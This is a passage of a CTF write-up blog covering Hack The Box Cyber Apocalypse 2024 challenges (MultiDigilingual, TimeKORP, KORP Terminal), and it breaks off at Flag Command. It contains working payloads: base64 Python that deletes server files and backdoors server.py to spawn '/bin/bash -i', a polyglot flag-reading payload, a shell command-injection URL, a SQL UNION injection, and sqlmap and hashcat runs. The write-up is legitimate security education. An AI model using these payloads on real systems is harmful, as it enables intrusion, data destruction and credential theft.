+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Executing Perl using command perl
+</span></span><span class="line"><span class="cl">    [+] Completed. Checking output
+</span></span><span class="line"><span class="cl">    [+] Passed the check
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Executing Ruby using command ruby
+</span></span><span class="line"><span class="cl">    [+] Completed. Checking output
+</span></span><span class="line"><span class="cl">    [-] Failed to pass test. You are not worthy enough...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To learn more about the code execution and checking, I test a variety of factors. For example, a sleep command will hang the check, but will still succeed after sleeping. I can do other interesting things like copy the flag to a new file (asdf.asdf), and cat this new file. Still acceptable. It is quite clear that what we are doing is really being executed by the system, which is important if we want to abuse code injection.</p>
+<p>Next, I thought if I can send a web request to a webhook site, I can append the flag to this and ezpz. Except, all efforts failed. Both <code>wget</code> and <code>curl</code> seem to be missing, and there is an interesting behavior that importing requests into python will suddenly and always fail the python flag check. I even tried to reconstruct curl by supplying base64 encoded version of the binary over several execution sessions. All failure. Eventually, I start dabbling in more destructive tests, and I learned you can break the service by sending <code>rm *</code>. It gave me a hunch, and I learned that by deleting a certain <code>.py</code> file, the instance bricks.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgncm0gKi5weScp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Executing Python3 using command python
+</span></span><span class="line"><span class="cl">    [+] Completed. Checking output
+</span></span><span class="line"><span class="cl">    [-] Failed to pass test. You are not worthy enough...
+</span></span><span class="line"><span class="cl">^C
+</span></span><span class="line"><span class="cl">$ nc 94.237.56.46 39938
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here I use <code>rm *.py</code> to destroy all python files. There is no response from the server now, and we have to reset the instance. Perhaps if we can identify the name of the file, we can insert our own code to run?? To figure it out, I was prepared to go through the long and arduous process of running through every alphabet character numerous times in order to squeeze out the obfuscated naming methods used to label this file. Fortunately as soon as I hit <code>s*.py</code>, I had a good idea that it was probably just named <code>server.py</code>, and it indeed was. Next is to inject our code. First I do a simple injection of invoking os.system to cat the flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">os.system(&#39;echo &#34;import os\nos.system(\&#39;cat flag.txt\&#39;)&#34; &gt;&gt; server.py&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The code in action:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAiaW1wb3J0IG9zXG5vcy5zeXN0ZW0oXCdjYXQgZmxhZy50eHRcJykiID4+IHNlcnZlci5weScp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Executing Python3 using command python
+</span></span><span class="line"><span class="cl">    [+] Completed. Checking output
+</span></span><span class="line"><span class="cl">    [-] Failed to pass test. You are not worthy enough...
+</span></span><span class="line"><span class="cl">^C
+</span></span><span class="line"><span class="cl">$ nc 94.237.62.54 33599
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">    [-] Failed to pass test. You are not worthy enough...
+</span></span><span class="line"><span class="cl">HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We inject and then have to create a new session, but once the code checking is finished, our flag is printed out at the end!
+On revisiting this a bit later, I decided to insert a full-blown shell session by invoking /bin/bash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">os.system(&#39;echo &#34;import os\nos.system(\&#39;/bin/bash -i\&#39;)&#34; &gt;&gt; server.py&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAiaW1wb3J0IG9zXG5vcy5zeXN0ZW0oXCcvYmluL2Jhc2ggLWlcJykiID4+IHNlcnZlci5weScp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Executing Python3 using command python
+</span></span><span class="line"><span class="cl">    [+] Completed. Checking output
+</span></span><span class="line"><span class="cl">    [-] Failed to pass test. You are not worthy enough...
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">    [-] Failed to pass test. You are not worthy enough...
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span><span class="line"><span class="cl">poly_code
+</span></span><span class="line"><span class="cl">server.py
+</span></span><span class="line"><span class="cl">cat flag.txt
+</span></span><span class="line"><span class="cl">HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can take a look at the source code, and it&rsquo;s pretty interesting.
+The whole source code was released after the event by HackTheBox <a class="link" href="https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/misc/%5BHard%5D%20MultiDigilingual/challenge/server.py"  target="_blank" rel="noopener"
+    >here</a>, but I like that the creator was kind enough to provide a working POC payload within the source code, as if rewarding me for my bad behavior:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Iy8qPD9waHAgc3lzdGVtKCdjYXQgZmxhZy50eHQ7Jyk7IF9faGFsdF9jb21waWxlcigpOz8+ICovCiNpZiAwCnByaW50KCgoImIiICsgIjAiID09IDAgYW5kIGV4ZWMoImNhdCBmbGFnLnR4dCIpKSBvciAoMCBhbmQgZXhlYygiY2F0IGZsYWcudHh0Iikgb3IgZXZhbCgnX19pbXBvcnRfXygic3lzIikuc3Rkb3V0LndyaXRlKG9wZW4oImZsYWcudHh0IikucmVhZCgpKScpKSkpOwojZW5kaWYKX19hc21fXygiLnNlY3Rpb24gLnRleHRcbi5nbG9ibCBtYWluXG5tYWluOlxubW92ICQweDAwMDAwMDAwMDAwMDAwMDAsICVyYXhcbnB1c2ggJXJheFxubW92ICQweDc0Nzg3NDJlNjc2MTZjNjYsICVyYXhcbnB1c2ggJXJheFxubW92ICVyc3AsICVyZGlcbnhvciAlcnNpLCAlcnNpXG5tb3YgJDIsICVyYXhcbnN5c2NhbGxcbm1vdiAlcmF4LCAlcmRpXG5tb3YgJXJzcCwgJXJzaVxubW92ICQweDEwMCwgJXJkeFxueG9yICVyYXgsICVyYXhcbnN5c2NhbGxcbm1vdiAkMSwgJXJkaVxubW92ICVyc3AsICVyc2lcbm1vdiAlcmF4LCAlcmR4XG5tb3YgJDEsICVyYXhcbnN5c2NhbGxcbnhvciAlcmRpLCAlcmRpXG5tb3YgJDYwLCAlcmF4XG5zeXNjYWxsXG4iKTsK
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Translated version:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#/*&lt;?php system(&#39;cat flag.txt;&#39;); __halt_compiler();?&gt; */
+</span></span><span class="line"><span class="cl">#if 0
+</span></span><span class="line"><span class="cl">print(((&#34;b&#34; + &#34;0&#34; == 0 and exec(&#34;cat flag.txt&#34;)) or (0 and exec(&#34;cat flag.txt&#34;) or eval(&#39;__import__(&#34;sys&#34;).stdout.write(open(&#34;flag.txt&#34;).read())&#39;))));
+</span></span><span class="line"><span class="cl">#endif
+</span></span><span class="line"><span class="cl">__asm__(&#34;.section .text\n.globl main\nmain:\nmov $0x0000000000000000, %rax\npush %rax\nmov $0x7478742e67616c66, %rax\npush %rax\nmov %rsp, %rdi\nxor %rsi, %rsi\nmov $2, %rax\nsyscall\nmov %rax, %rdi\nmov %rsp, %rsi\nmov $0x100, %rdx\nxor %rax, %rax\nsyscall\nmov $1, %rdi\nmov %rsp, %rsi\nmov %rax, %rdx\nmov $1, %rax\nsyscall\nxor %rdi, %rdi\nmov $60, %rax\nsyscall\n&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As an ending note, <code>curl</code> and <code>wget</code> were confirmed missing via the bash session.</p>
+<h2 id="web">Web
+</h2><h3 id="timekorp">TimeKORP
+</h3><p>Difficulty: Very Easy</p>
+<blockquote>
+<p>Are you ready to unravel the mysteries and expose the truth hidden within KROP&rsquo;s digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.</p>
+</blockquote>
+<hr>
+<p>Within the source code, we can begin by looking at what/where we can supply custom input. In general, controllers and routes are most interesting, as controllers usually handle the back-end behaviors and routes will detail what endpoints exist in the web service. In the controller file TimeController.php:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TimeController</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$format</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;format&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;format&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;%H:%M:%S&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$time</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TimeModel</span><span class="p">(</span><span class="nv">$format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$router</span><span class="o">-&gt;</span><span class="na">view</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;time&#39;</span> <span class="o">=&gt;</span> <span class="nv">$time</span><span class="o">-&gt;</span><span class="na">getTime</span><span class="p">()]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see in a GET request, this server is taking a parameter <code>format</code>, and calls TimeModel. Within TimeModel, we can see how format is used. Remember that this is a field supplied by us, after the URL parameter:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TimeModel</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$format</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span> <span class="o">=</span> <span class="s2">&#34;date &#39;+&#34;</span> <span class="o">.</span> <span class="nv">$format</span> <span class="o">.</span> <span class="s2">&#34;&#39; 2&gt;&amp;1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getTime</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$time</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$res</span>  <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$time</span> <span class="o">:</span> <span class="s1">&#39;?&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Format is inserted  directly into <code>command</code> then later used as <code>exec</code>. Without sanitizing, this leads to a command injection vulnerability. Our argument will be surrounded by single quotes, so as long as we supply a quote to escape, we can input shell commands:
+<code>'; id;'</code>  as an example payload. In this command, I escape the wrapped quotes by supplying <code>'</code>, and end the date command with <code>;</code>. I run <code>id</code>, and finish by ending in a single quote so that our command won&rsquo;t have syntax errors from the quote mark following our injection. Running the command on the webpage:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/timekorpid.png"
+	width="738"
+	height="201"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/timekorpid_hu10701564112737397507.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/timekorpid_hu9231426099212378434.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="367"
+		data-flex-basis="881px"
+	
+></p>
+<p>We see the command injection works! Now to simply cat the flag. The source code provides a sample flag in the base directory, so we should first check as <code>/flag</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://94.237.58.155:43833/?format=&#39;;cat /flag&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-cyber-apocalypse-2024/images/timekorpflag.png"
+	width="941"
+	height="286"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/timekorpflag_hu14778590981412234.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/timekorpflag_hu6076657805439924989.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="329"
+		data-flex-basis="789px"
+	
+>
+Note that the file didn&rsquo;t have a <code>.txt</code> extension, so we don&rsquo;t include it either. A bit of a weird choice, but whatever.
+<code>HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}</code></p>
+<h3 id="korp-terminal">KORP Terminal
+</h3><p>Difficulty: Very Easy</p>
+<blockquote>
+<p>Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries&rsquo; privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.</p>
+</blockquote>
+<hr>
+<p>We don&rsquo;t receive source code, so we have to go in blind. Landing in the website, we are immediately greeted with a login page:
+<img src="/p/hackthebox-cyber-apocalypse-2024/images/login.png"
+	width="803"
+	height="204"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/login_hu15645565582259782405.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/login_hu4287960772584097803.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="393"
+		data-flex-basis="944px"
+	
+></p>
+<p>Basic credentials like admin:admin aren&rsquo;t working for me, so we need to look at circumventing. Since is this categorized as a very easy, I have strong suspicion that this is an SQL injection type problem. Eventually I find an error that shows I&rsquo;m correct. By supplying a UNION injection with incorrect column numbers, it tells me so:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;UNION SELECT 1,2-- -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-cyber-apocalypse-2024/images/sqlerror.png"
+	width="627"
+	height="138"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/sqlerror_hu3997284633838144469.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/sqlerror_hu3908177181099539206.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="454"
+		data-flex-basis="1090px"
+	
+></p>
+<p>It is SQL injection, but I ended up having a lot of trouble getting any payload to work.. I ended up using SQLMap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sqlmap http://83.136.254.16:49302/ --data &#34;username=admin&amp;password=password&#34; --batch --ignore-code 401 --dump
+</span></span><span class="line"><span class="cl">        ___
+</span></span><span class="line"><span class="cl">       __H__
+</span></span><span class="line"><span class="cl"> ___ ___[&#34;]_____ ___ ___  {1.7.12#stable}
+</span></span><span class="line"><span class="cl">|_ -| . [&#39;]     | .&#39;| . |
+</span></span><span class="line"><span class="cl">|___|_  [&#39;]_|_|_|__,|  _|
+</span></span><span class="line"><span class="cl">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">Table: users
+</span></span><span class="line"><span class="cl">[1 entry]
+</span></span><span class="line"><span class="cl">+----+--------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl">| id | password                                                     | username |
+</span></span><span class="line"><span class="cl">+----+--------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl">| 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
+</span></span><span class="line"><span class="cl">+----+--------------------------------------------------------------+----------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using hashcat to crack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ hashcat -m 3200 &#39;$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.&#39; /usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
+</span></span><span class="line"><span class="cl">                                                          
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+</span></span><span class="line"><span class="cl">Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv.
+</span></span><span class="line"><span class="cl">Time.Started.....: Sat Mar  9 11:38:16 2024 (31 secs)
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sat Mar  9 11:38:47 2024 (0 secs)
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Speed.#1.........:       45 H/s (7.76ms) @ Accel:16 Loops:8 Thr:11 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
+</span></span><span class="line"><span class="cl">Progress.........: 1408/14344384 (0.01%)
+</span></span><span class="line"><span class="cl">Rejected.........: 0/1408 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Point....: 1232/14344384 (0.01%)
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4088-4096
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: pedro -&gt; tagged
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 63c Fan: 36% Util:100% Core:1316MHz Mem:3004MHz Bus:4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Sat Mar  9 11:38:10 2024
+</span></span><span class="line"><span class="cl">Stopped: Sat Mar  9 11:38:48 2024
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The password is <code>password123</code>; simple enough to brute force guess if you&rsquo;re lucky. It&rsquo;s hard to say what was actually intended with this, as sqlmap utilized blind boolean injection which is definitely a tier above <code>Very Easy</code> to do manually. When we log in, the flag is right there:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/sqlflag.png"
+	width="442"
+	height="100"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/sqlflag_hu2036826082437925493.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/sqlflag_hu9182128367981027858.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="442"
+		data-flex-basis="1060px"
+	
+>
+<code>HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}</code></p>
+<h3 id="flag-command">Flag Command
+</h3><p>Difficulty: Very Easy</p>
+<blockquote>
+<p>Embark on the &ldquo;Dimensional Escape Quest&rdquo; where you wake up in a mysterious forest maze that&rsquo;s not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!</p>
+</blockquote>
+<hr>
+<p>There is no source code for this challenge. When we enter, we are greeted with this unpleasant green font and an input prompt:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/flagcommand1.png"
+	width="908"
+	height="950"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/flagcommand1_hu7874159916231270898.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/flagcommand1_hu11347170488189300472.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="95"
+		data-flex-basis="229px"
+	
+>
+When we peek at the web view-source code, we can see that the service seems to largely run on static javascript:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;[/static/terminal/js/commands.js](view-source:http://94.237.50.51:55966/static/terminal/js/commands.js)&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;module&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;[/static/terminal/js/main.js](view-source:http://94.237.50.51:55966/static/terminal/js/main.js)&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;module&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;[/static/terminal/js/game.js](view-source:http://94.237.50.51:55966/static/terminal/js/game.js)&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;module&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>commands.js</code> ends up being largely uninteresting, but when we look at <code>main.js</code> we can find the conditions to achieve certain step numbers:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
